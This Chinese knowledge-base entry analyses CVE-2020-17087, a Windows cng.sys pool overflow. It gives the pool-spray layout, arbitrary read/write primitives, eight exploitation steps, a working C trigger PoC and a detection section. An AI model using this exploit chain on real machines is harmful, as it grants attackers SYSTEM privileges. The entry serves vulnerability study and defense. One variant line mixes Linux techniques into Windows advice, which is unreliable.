---
id: binary-pwn-kernel-windows-cng-pool-overflow-pipe-data-queue-token-steal
title: Windows CNG.sys CVE-2020-17087 整数截断非分页池溢出：命名管道 DATA_QUEUE_ENTRY 池喷射到任意读写与 token 窃取
type: scenario
domain: binary
path: binary/pwn/kernel
technique: windows-cng-pool-overflow-pipe-data-queue-token-steal
tags:
- windows
- kernel
- pwn
- pool-overflow
- integer-truncation
- named-pipe
- npfs
- data-queue-entry
- arbitrary-read
- arbitrary-write
- token-stealing
- lpe
- cve-2020-17087
cve:
- CVE-2020-17087
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V171
  verified_at: '2026-11-06T17:42:41+08:00'
  notes: 已读全文与 68 张抽取图核对：CVE-2020-17087、IOCTL 0x390400、USHORT 6*SourceLength 截断 0x10002→2、命名管道 DATA_QUEUE_ENTRY 布局、0x0020 校验值、0xDFE0/0x4000=3、token 替换与 whoami SYSTEM 均一致；已修正 0x2020 为 0x0020、明确宽字符 6 字节写放大；原文只给复现环境 Windows 10 2004 19041.264，未给受影响区间，按 brief 清除 affected_versions；未本机复跑。
url: /docs/binary/pwn/kernel/binary-pwn-kernel-windows-cng-pool-overflow-pipe-data-queue-token-steal/
draft: false
kb_aliases:
- CVE-2020-17087
- cng.sys 池溢出
- CfgAdtpFormatPropertyBlock 整数截断
- 命名管道池喷射
- DATA_QUEUE_ENTRY 任意读写
- Windows 内核池提权
- token 窃取
---

## 一句话结论

CVE-2020-17087 在 `cng.sys!CfgAdtpFormatPropertyBlock` 中用 `USHORT DestinationSize = (USHORT)(6 * SourceLength)` 计算非分页池分配大小，`SourceLength=0x2AAB` 时 `0x10002` 被截断成 `2` 字节，但随后按完整长度写入约 `0x10000` 字节，形成非分页池溢出；利用命名管道 `npfs.sys` 的 `DATA_QUEUE_ENTRY` 做池喷射，只覆盖相邻条目 `Flink` 的低 2 字节，把它指向伪造的 `undercover_entry`，再借 `PeekNamedPipe` 与伪造 IRP 实现任意读/写，最终把 system 进程 token 复制到当前进程完成本地提权。

## 原理

- **漏洞点**：`\Device\Cng` 暴露 IOCTL `0x390400`，处理函数 `CfgAdtpFormatPropertyBlock` 先用 16 位 `USHORT` 保存 `6 * SourceLength` 的分配大小。`SourceLength = 0x2AAB` 时 `6 * 0x2AAB = 0x10002`，截断后 `DestinationSize = 0x0002`，`BCryptAlloc` 只分配 2 字节非分页池。
- **写放大**：后续循环把每个源字节格式化成 3 个宽字符（两个十六进制字符加一个空格，每个宽字符 2 字节，共 6 字节）写入 `OutputBuffer`，实际写入 `0x10002` 字节，远超 2 字节分配，覆盖相邻池块。溢出内容以 UTF-16LE 的十六进制字符和空格为主，攻击者只能部分控制，因此不能直接写任意结构，只能利用布局把“可控制的那几个字节”对准目标。
- **相邻对象选型**：命名管道写入时 `npfs.sys` 在非分页池分配 `DATA_QUEUE_ENTRY`，其结构为 `LIST_ENTRY NextEntry; _IRP *Irp; _SECURITY_CLIENT_CONTEXT *SecurityContext; uint32 EntryType; uint32 QuotaInEntry; uint32 DataSize; uint32 x; char Data[]`。`NextEntry.Flink/Blink` 是双向链表指针，`EntryType=0` 为缓冲条目、`1` 为非缓冲条目（数据在 `IRP->SystemBuffer`）。
- **池喷射布局**：为了让溢出落在可控的 `DATA_QUEUE_ENTRY` 上，作者用约 10000 个 `victim_pipe`，每个管道先写入 0x2d0 的 `first_entry`，再写入 0x4000 的 `second_entry`；用 0x1f0 的 `spare_pipe` 清空 `FreeChunkTree`（VS 分配器），用 0x8e20 的 `subsegments_pipe` 注入大子段隔离布局区域，用 0x8d2 的 48 个 `spare_pipe` 预热 LFH，并用同尺寸 `bcrypt_pipe` 分配漏洞块；前后再用大量 0x4000 `spare_pipe` 保护。这样漏洞块与某个 `first_entry` 相邻，溢出只改到它的 `Flink` 低 2 字节。
- **Flink 重定向**：被改写的 `first_entry.Flink` 从原 `second_entry` 指向同一喷射区中另一个 `second_entry` 内的伪造 `undercover_entry`（位于 `g_cover_pipe_data + 0xFF0`，0x30 字节，`EntryType=1`、`DataSize` 可控、`IRP` 指向伪造 IRP）。`second_entry` 间距 0x4000，原文用 `0xDFE0 / 0x4000 = 3` 判断隔了 3 个条目；遍历链表时用 `previous_entry_flink % 0x10000 == 0x0020` 识别被覆盖的 `first_entry`。
- **任意读**：伪造的非缓冲条目把 `IRP->SystemBuffer` 设为目标内核地址，`DataSize` 设为读取长度；调用 `PeekNamedPipe` 触发 `NpPeek → NpReadDataQueue`，把 `SystemBuffer` 指向的内容复制到用户缓冲区。选 `PeekNamedPipe` 而不是 `ReadFile` 的关键是 peek 不删除条目，且能绕过 Win7 之后 `LIST_ENTRY` 的安全取消链接检查（读 `DataSize` 字节后 `entry->flink->blink != entry` 会触发错误）。
- **地址定位**：`NpDecodeFileObject` 从 `FileObject->FsContext2` 取 CCB，`NpPeek` 中 `FsContext2 & ~0xf` 得到 `CCB->DataQueue`；据此可由管道句柄算出内核池中的队列头地址，再用双向链表找到 `second_entry`、`first_entry`，并用被覆盖的 0x0020 低字节做精确校验。
- **任意写与提权**：伪造 IRP（`ThreadListEntry` 等字段），通过 `NtFsControlFile`（FSCTL 0x119FF8）创建非缓冲条目并把伪造 IRP 放入其中；`IofCompleteRequest` 内部运算会按伪造 IRP 写内存。用 `ThreadedWriter` 再创建一个阻塞条目（`stalled_entry`），从 `IRP->ThreadListEntry.Flink` 得到 `ETHREAD->IrpList`（ETHREAD+0x4B0），再由 `ETHREAD->ThreadListEntry.Flink`（ETHREAD+0x4E8）得到 `EPROCESS->ThreadListHead.Flink`（EPROCESS+0x30/0x38），从而定位当前进程与 system 进程的 EPROCESS。
- **token 替换**：按 EPROCESS 偏移表（原文针对 1709+ 给出 `{0x2e0,0x358,0x488}` 与 `{0x440,0x4b8,0x5e0}` 两组候选，用于 `UniqueProcessId`、`ActiveProcessLinks`、`Token` 等字段）找到当前进程 token 地址，再把 system 进程 token 的值任意写到当前进程 token，`ReadFile` 释放条目触发 `IofCompleteRequest` 后 `whoami` 变为 `nt authority\system`。

## 触发条件

- 目标为未打补丁的 Windows（原文环境 Windows 10 2004 19041.264，CVE-2020-17087 影响多个 Windows 版本），普通用户可打开 `\\.\GLOBALROOT\Device\Cng` 并发送 IOCTL `0x390400`。
- `cng.sys!CfgAdtpFormatPropertyBlock` 存在 `USHORT` 截断；`SourceLength` 可取到 `0x2AAB` 以上且输入缓冲区可构造。
- 攻击者可创建大量命名管道并进行写入/Peek 操作，非分页池布局可控；内核符号/EPROCESS 偏移已知或可泄露。
- 目标未启用阻止用户态地址作为伪造 IRP/SystemBuffer 的缓解（原文提到无 SMAP 时可直接把 IRP 放用户态），或攻击者能把伪造结构放到内核可控地址。
- 需要普通用户权限即可触发，最终目标是本地提权到 SYSTEM。

## 利用步骤

1. 打开 `\\.\GLOBALROOT\Device\Cng`，按 PoC 构造 `IoctlData`：`DataBufferSize=0x2AAB`，`IoctlSize=4096+DataBufferSize`，在偏移 0x50 写入 `0x2AAB`，在 0x200/0x400 写入 `FUNCTION`/`PROPERTY` 等字段，调用 `DeviceIoControl(hCng, 0x390400, ...)` 触发截断溢出。
2. 按池布局创建 `victim_pipe`（每个含 0x2d0 `first_entry` 与 0x4000 `second_entry`）、`spare_pipe`（0x1f0 清 FreeChunkTree）、`subsegments_pipe`（0x8e20 大子段隔离）、0x8d2 的 LFH 预热管道和 `bcrypt_pipe`；把 `g_cover_pipe_data` 前 0x4000 清零并在 `+0xFF0` 伪造 `undercover_entry`。
3. 释放漏洞块并触发 `CfgAdtpFormatPropertyBlock`，让溢出覆盖相邻 `first_entry.Flink` 的低 2 字节，使其指向 `undercover_entry`；用 `previous_entry_flink % 0x10000 == 0x0020` 找到被覆盖的 `victim_pipe`。
4. 用 `PeekNamedPipe(victim_pipe, g_buf, ...)` 触发 `NpPeek/NpReadDataQueue`，借伪造 `undercover_entry` 的 `DataSize` 与 `IRP->SystemBuffer` 读取任意内核地址；先用它泄露 `second_entry`/`first_entry` 地址并校验链表。
5. 通过 `NpDecodeFileObject` 的 `FsContext2` 与 `NpPeek` 中的 `CCB->DataQueue` 计算管道队列头地址，建立句柄到内核池地址的映射。
6. 构造伪造 IRP，用 `NtFsControlFile`（FSCTL 0x119FF8）创建非缓冲条目把伪造 IRP 放入内核池；再用 `ThreadedWriter` 创建 `stalled_entry`，泄露 `IRP->ThreadListEntry → ETHREAD → EPROCESS` 链。
7. 读取当前进程与 system 进程的 `UniqueProcessId`/`ActiveProcessLinks`/`Token` 偏移，定位 system token。
8. 用任意写把 system token 写到当前进程 token；`ReadFile` 释放条目触发 `IofCompleteRequest`，`whoami` 变为 `nt authority\system`，完成提权。

## PoC

漏洞触发 PoC（原文，Windows 10 2004 19041.264）：

```c
#include <cstdio>
#include <windows.h>

int main() {
    HANDLE hCng = CreateFileA("\\\\.\\GLOBALROOT\\Device\\Cng",
                              GENERIC_READ | GENERIC_WRITE, 0, NULL,
                              OPEN_EXISTING, 0, NULL);
    if (hCng == NULL) return 1;

    CONST DWORD DataBufferSize = 0x2AAB;          // (uint16)(0x2AAB*6)=2
    CONST DWORD IoctlSize = 4096 + DataBufferSize;
    BYTE *IoctlData = (BYTE *)HeapAlloc(GetProcessHeap(), 0, IoctlSize);
    RtlZeroMemory(IoctlData, IoctlSize);

    *(DWORD*)    &IoctlData[0x00] = 0x1A2B3C4D;
    *(DWORD*)    &IoctlData[0x04] = 0x10400;
    *(DWORD*)    &IoctlData[0x08] = 1;
    *(ULONGLONG*)&IoctlData[0x10] = 0x100;
    *(DWORD*)    &IoctlData[0x18] = 3;
    *(ULONGLONG*)&IoctlData[0x20] = 0x200;
    *(ULONGLONG*)&IoctlData[0x28] = 0x300;
    *(ULONGLONG*)&IoctlData[0x30] = 0x400;
    *(DWORD*)    &IoctlData[0x38] = 0;
    *(ULONGLONG*)&IoctlData[0x40] = 0x500;
    *(ULONGLONG*)&IoctlData[0x48] = 0x600;
    *(DWORD*)    &IoctlData[0x50] = DataBufferSize;   // OVERFLOW
    *(ULONGLONG*)&IoctlData[0x58] = 0x1000;
    *(ULONGLONG*)&IoctlData[0x60] = 0;
    RtlCopyMemory(&IoctlData[0x200], L"FUNCTION", 0x12);
    RtlCopyMemory(&IoctlData[0x400], L"PROPERTY", 0x12);

    ULONG_PTR OutputBuffer = 0;
    DWORD BytesReturned;
    DeviceIoControl(hCng, 0x390400, IoctlData, IoctlSize,
                    &OutputBuffer, sizeof(OutputBuffer), &BytesReturned, NULL);

    HeapFree(GetProcessHeap(), 0, IoctlData);
    CloseHandle(hCng);
    return 0;
}
```

完整提权 exp（命名管道池喷射、伪造 `DATA_QUEUE_ENTRY`/IRP、任意读写、token 替换）见原文参考的 vp777 `Windows-Non-Paged-Pool-Overflow-Exploitation` 项目；本文未附完整代码，未在本机复跑。原文运行结果：普通用户 `desktop-ors0p6d\deli` 执行 exp 后 `whoami` 返回 `nt authority\system`。

## 变体与关联

- 变体：溢出目标不一定是 `DATA_QUEUE_ENTRY`，任何带函数指针/链表指针的非分页池对象都可作为相邻受害者；关键是溢出字节的可控程度与对象布局。
- 变体：任意读可用 `PeekNamedPipe`，也可用其他不消费条目的 peek/query 操作；任意写可用伪造 IRP、`IofCompleteRequest`、`NtFsControlFile` 等组合。
- 变体：提权可改为直接改 token、改 `EPROCESS->Token`、调用 `commit_creds` 等价内核函数、或写入 `modprobe_path`/`core_pattern` 等（Windows 对应 `SeDebugPrivilege`/`PsSetCreateProcessNotifyRoutine` 等）。
- 关联：[[binary-pwn-kernel-task-struct-comm-scan-init-cred-lpe]]（Linux 侧 token/cred 扫描提权思路）、[[binary-pwn-kernel-dirty-pagetable-pmd-pte-overlap-physical-rw]]（内核池/页级原语到任意物理读写）、[[pentest-privilege-escalation-windows-executioncontext-user-callback-hijack]]（Windows 驱动 IOCTL 回调劫持的另一条 LPE 路径）。

## 检测与防御

- **补丁**：安装 CVE-2020-17087 的微软安全更新；核心修复是把 `6 * SourceLength` 用足够宽的整数计算并在分配/写入前做上界校验。
- **驱动审计**：所有 `USHORT`/`uint16` 长度计算都要检查乘法溢出与截断；分配大小必须与后续写入长度一致；对用户可控 `SourceLength` 做上限限制。
- **攻击面收敛**：普通用户不应能直接打开 `\Device\Cng` 并下发任意 IOCTL；按需移除/禁用不使用的 CNG 功能，限制设备 ACL。
- **内核缓解**：开启 KASLR、SMEP/SMAP、HVCI、CFG、Pool zeroing、`NonPagedPoolNx` 等；在支持的系统上启用内核池完整性/池溢出检测。
- **检测**：监控异常 IOCTL `0x390400` 与超大 `SourceLength`、短时间创建大量命名管道、`PeekNamedPipe` 高频调用、非分页池块大小与写入长度不一致、`IofCompleteRequest` 异常调用链、进程 token 被替换为 system token。
